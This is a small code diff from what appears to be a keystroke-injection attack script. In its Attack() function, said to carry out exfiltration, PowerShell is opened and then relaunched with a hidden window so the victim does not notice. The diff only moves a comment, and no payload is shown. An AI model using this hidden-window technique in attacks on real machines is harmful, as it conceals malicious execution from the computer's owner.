@@ -15,8 +15,8 @@ function Attack() { 	// Initalizes the function Attack that acually exfiltrates 
   type("powershell\n");	 // Opens powershell
   delay(500);
   
-  // Makes powershell hidden throughout the attack. 
   type("powershell -windowstyle hidden {"); // Makes the window hidden for the duration of the attack
+  
   type("exit;}\n");  					            	// Adds the close curly bracket making the attack hidden and starts the attack 
 }
 
